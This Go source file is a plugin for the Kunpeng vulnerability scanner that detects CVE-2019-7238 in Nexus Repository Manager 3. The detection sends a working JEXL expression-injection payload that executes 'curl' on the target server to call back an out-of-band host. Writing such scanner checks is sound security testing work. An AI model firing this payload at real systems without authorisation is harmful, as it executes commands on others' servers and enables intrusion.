package goplugin

import (
	"fmt"
	"net/http"
	"strings"

	"github.com/opensec-cn/kunpeng/plugin"
	"github.com/opensec-cn/kunpeng/util"
)

type nexusRCE struct {
	info   plugin.Plugin
	result []plugin.Plugin
}

func init() {
	plugin.Regist("nexus", &nexusRCE{})
}
func (d *nexusRCE) Init() plugin.Plugin {
	d.info = plugin.Plugin{
		Name:    "Nexus Repository Manager 3 远程代码执行漏洞",
		Remarks: "由于 Nexus Repository Manager 3 访问控制措施缺失，未授权的用户可利用该问题构造特定请求在服务器上执行 Java 代码，从而达到远程代码执行的目的，可导致服务器被入侵控制。",
		Level:   0,
		Type:    "RCE",
		Author:  "wolf",
		References: plugin.References{
			URL:  "https://www.anquanke.com/post/id/171116",
			CVE:  "CVE-2019-7238",
			KPID: "KP-0035",
		},
	}
	return d.info
}
func (d *nexusRCE) GetResult() []plugin.Plugin {
	return d.result
}
func (d *nexusRCE) Check(URL string, meta plugin.TaskMeta) bool {
	if util.GetAiderNetloc() == "" {
		return false
	}
	rand := util.GetRandomString(5)
	aiderURL := fmt.Sprintf("%s/add/%s", util.GetAiderNetloc(), rand)
	poc := `{
		"action": "coreui_Component",
		"method": "previewAssets",
		"data": [{
			"page": 1,
			"start": 0,
			"limit": 50,
			"sort": [{
				"property": "name",
				"direction": "ASC"
			}],
			"filter": [{
				"property": "repositoryName",
				"value": "*"
			}, {
				"property": "expression",
				"value": "\"\".class.class.forName(\"java.lang.Runtime\").getRuntime().exec(\"curl %s\")"
			}, {
				"property": "type",
				"value": "jexl"
			}]
		}],
		"type": "rpc",
		"tid": 26
	}`
	request, err := http.NewRequest("POST", URL+"/service/extdirect", strings.NewReader(fmt.Sprintf(poc, aiderURL)))
	if err != nil {
		return false
	}
	request.Header.Set("Content-Type", "application/json")
	resp, err := util.RequestDo(request, true)
	if err != nil {
		return false
	}
	if util.AiderCheck(rand) {
		result := d.info
		result.Response = resp.ResponseRaw
		result.Request = resp.RequestRaw
		d.result = append(d.result, result)
		return true
	}
	return false
}
